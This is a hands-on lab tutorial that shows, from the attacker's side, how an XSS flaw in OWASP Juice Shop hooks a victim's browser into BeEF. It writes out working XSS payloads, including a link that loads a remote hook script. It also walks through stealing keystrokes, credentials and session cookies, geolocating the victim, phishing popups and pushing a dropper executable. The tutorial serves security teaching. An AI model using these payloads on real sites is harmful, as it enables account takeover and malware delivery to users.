<h1 id="beef-tutorial">BeEF Tutorial</h1>
<p>
  This tutorial assumes you followed the
  <a href="README.md">installation instructions</a> and that the BeEF
  application is up and running, and can be reached at
  <a href="http://beef.local:3000">http://beef.local:3000</a>, and that Juice
  Shop is up and running, and can be reached at
  <a href="http://vulnerable.local:3500">http://vulnerable.local:3500</a>.
</p>
<p>
  Let’s see what you can do with BeEF: This tutorial will show you, as an
  attacker, what you can do to a victim, by exploiting a Cross-Site Scripting
  vulnerability.
</p>
<h2 id="attackers-point-of-view-1">Attacker’s point of view (1)</h2>
<p>
  First, let’s log onto BeEF’s administrative panel by going to
  <a href="http://beef.local:3000/ui/panel">http://beef.local:3000/ui/panel</a>
  Enter here the login credentials (the default username / password is
  <code>beefadmin</code> / <code>difficultpassword</code>).
</p>
<p>
  This is the view point of the attacker. At the left hand there’s an overview
  with Hooked Browsers: clients that can be controlled by the BeEF framework.
  When starting up, this will be empty.
</p>
<h2 id="victims-point-of-view-1">Victim’s point of view (1)</h2>
<p>
  There are two vulnerable web sites. One has already been exploited, and
  another one needs manual exploitation. Both examples can be used throughout
  the demo, but the Juice Shop example is recommended, as it’s more realistic.
</p>
<p>
  For the victim’s point of view, open a <em>new browser window</em>. The same
  browser window can be used for both examples.
</p>
<h3 id="automatically-exploited-simple-form">
  Automatically exploited (simple form)
</h3>
<p>
  Let’s now surf to a vulnerable site which contains a Cross-Site Scripting
  vulnerability.
  <a href="http://vulnerable.local:3000/demos/basic.html"
    >http://vulnerable.local:3000/demos/basic.html</a
  >
</p>
<p>
  This specific vulnerable instance has already been exploited: This is an
  example of a ‘stored Cross-Site Scripting vulnerability’, where the payload is
  automatically executed. Even though you’re visiting
  <code>vulnerable.local:3000</code>, there’s a direct hook into the BeEF
  framework.
</p>
<h3 id="manual-exploitation-juice-shop">Manual exploitation (Juice Shop)</h3>
<p>
  For a more realistic scenario, go to
  <a href="http://vulnerable.local:3500">http://vulnerable.local:3500</a> and
  click on the search icon in the top right. This will open up a search box.
  Search for “banana”. This will return all results having “banana” in their
  description.
</p>
<p>
  Now, an attacker discovered that the site contains a Cross-Site Scripting
  vulnerability. Search for the term
</p>
<div class="sourceCode" id="cb1">
  <pre
    class="sourceCode javascript"
  ><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="op">&lt;</span>img src<span class="op">=</span>a onerror<span class="op">=</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">&gt;</span></span></code></pre>
</div>
<p>
  <a
    href="http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E"
    >&lt;http://vulnerable.local:3500/#/search?q=%3Cimg%20src%3Da%20onerror%3Dalert(1)%3E&gt;</a
  >.
</p>
<p>
  This will execute a reflected Cross-Site Scripting payload - an alert box will
  pop up, showing a 1.
</p>
<p>
  What’s the damage, you’d think? Just an alert box, right? Well, this tutorial
  will show you how you much damage you can do with ‘just’ a Cross-Site
  Scripting exploit…
</p>
<p>
  Say that the attacker crafted a link pointing to the vulnerable site, which
  would execute a bit more realistic payload. It is up to the attacker to entice
  victims to click on that link, for example by social engineering, using link
  shorteners and messaging the link.
</p>
<p>
  Click on the following link, prepared by the attacker:
  <a
    href="http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement(&#39;script&#39;);a.type%3D&#39;text%2Fjavascript&#39;;a.src%3D&#39;http:%2F%2Fbeef.local:3000%2Fhook.js&#39;;document.body.appendChild(a);%60)%3Eapple"
    >http://vulnerable.local:3500/#/search?q=%3Cimg%20width=0%20height=0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement(‘script’);a.type%3D’text%2Fjavascript’;a.src%3D’http:%2F%2Fbeef.local:3000%2Fhook.js’;document.body.appendChild(a);%60)%3Eapple</a
  >
</p>
<p>
  Nothing weird happens, right? You don’t see results, but that’s all. Say now
  that the victim wants to log on to the site, and clicks on the account link
  top right. Fill in the account details of an existing account:
  <code>admin@juice-sh.op</code> / <code>admin123</code>.
</p>
<p>The victim is logged in, and everything looks okay.</p>
<p>
  However, the payload contained a hook to the attacker’s BeEF instance:
  <code>&lt;script src="http://beef.local:3000/hook.js"&gt;</code>. What does
  this do? Well, this ensures that the web site <em>is hooked</em> onto the BeEF
  application.
</p>
<h2 id="attackers-point-of-view-2">Attacker’s point of view (2)</h2>
<p>
  Switching back to
  <a href="http://beef.local:3000/ui/panel">http://beef.local:3000/ui/panel</a>,
  at the left hand you can see that a victim is online: a browser is currently
  hooked. From the moment the victim clicked on the link, the attacker
  controlled all of the web content in the
  <a href="http://vulnerable.local:3000">http://vulnerable.local:3000</a> tab.
  Click in the left hand on the hooked browser in the
  <code>vulnerable.local</code> domain.
</p>
<p>
  On the active tab <em>Details</em> you can see all kinds of information about
  the victim: The operating system for example, but also screen resolution for
  example, settings, and enabled browser plugins.
</p>
<p>
  Select the tab <em>Logs</em>. Here you can see what the victim is doing during
  this session.
  <strong
    >All entered text as well as mouse and keyboard commands are
    intercepted</strong
  >. If you look carefully you can read the username, and password that the user
  entered.
</p>
<p>
  <strong>The attacker successfully stole the username and password</strong>
</p>
<h3 id="grabbing-the-session-cookie">Grabbing the session cookie</h3>
<p>
  Select the <em>Commands</em> tab. This is where the majority of actions will
  be performed. In the Module Tree, search for <em>cookie</em>. Select
  <em>Get Cookie</em>. Now, in the rightmost side of the screen you can click on
  <em>Execute</em>. This will execute the selected command.
</p>
<p>
  In the <em>Module Results History</em> section, an entry appears, with the
  selected command. If you click on the command, which will have label
  <em>command 1</em>, you will see the results at the right hand side. This is
  the session cookie of the logged in user: all that the attacker needs to take
  over the victim’s session.
</p>
<p><strong>The attacker successfully stole the session cookie</strong></p>
<h3 id="fingerprint-the-victim">Fingerprint the victim</h3>
<p>Let’s fingerprint the browser, so the victim can be followed.</p>
<p>
  Search for <em>fingerprint</em>, and click on the
  <em>Fingerprint Browser</em> module. Now, in the rightmost side of the screen
  you can click on <em>Execute</em>. This will execute the selected command.
</p>
<p>
  Search for <em>geolocation</em> and select the
  <em>Get Geolocation (Third Party)</em> module. In the rightmost side, select
  for example the second entry, <code>https://ip.nf/me.json</code> API. you now
  click on <em>Execute</em>, the attacker will find out where the victim,
  visiting
  <a href="http://vulnerable.local:3500">http://vulnerable.local:3500</a>, will
  be located.
</p>
<p>
  <strong
    >The attacker successfully fingerprinted and located the victim</strong
  >
</p>
<h3 id="trick-the-victim">Trick the victim</h3>
<p>
  Next the attacker can trick the victim into divulging secrets. Search for
  <em>Pretty Theft</em> and execute that module. The victim will now see a
  popup, asking to enter a username and password. This is how credentials can be
  stolen.
</p>
<p>
  For another example, search for <em>Fake</em> and select the
  <em>Fake Notification Bar (Chrome)</em> module. In the right hand of the
  screen, enter the following as URL:
</p>
<pre><code>http://beef.local:3000/demos/droppers/dropper.exe</code></pre>
<p>
  This file is located on the BeEF server, and will be the payload. For
  demonstration purposes, this is a Windows executable, the calculator. Note
  that you can add any file in the <code>droppers</code> directory, and it can
  be accessed directly using
  <code>http://beef.local:3000/demos/droppers/</code> and then the name of the
  file.
</p>
<p>
  When clicking on <em>Execute</em>, the module will send a convincingly looking
  update notification. As soon as the victim clicks on the notification, a file
  will be downloaded.
</p>
<p>
  <strong
    >The attacker successfully pushed a rogue executable to the victim</strong
  >
</p>
<h3 id="fun-and-games">Fun and games</h3>
<p>
  <strong>Note:</strong> For best results for the next demos, let the victim
  first click on the <strong>OWASP Juice Shop</strong> logo in the top left, so
  that all search results are visible. The more visual elements, the better…
</p>
<p>
  Just for fun, play a sound on the victim’s computer. Search for
  <em>sound</em> and execute the <em>Play Sound</em> module.
</p>
<p>
  Is the sound on? Then we can do better… Search for <em>raw</em> and select the
  <em>Raw JavaScript</em> module. Paste the following code in the JavaScript
  Code window:
</p>
<pre><code>var b = document.createElement(&#39;script&#39;);
b.type = &#39;text/javascript&#39;;
b.src = &#39;http://extract.pw/shake.js&#39;;
document.body.appendChild(b);</code></pre>
<p>Click on <em>Execute</em>.</p>
<p><strong>The attacker successfully executed arbitrary JavaScript</strong></p>
<h3 id="god-exploit">GOD exploit</h3>
<p>
  For the ultimate exploit, search for <em>rick</em> and select the
  <em>Redirect Browser (Rickroll)</em> module. Execute this module, and the
  victim will be shown the infamous Rick Astley video.
</p>
<p>
  Of course these are all benign examples, but imagine what a skilled attacker
  can do, having such control over the victim’s browser and ultimately security
  of its operating system.
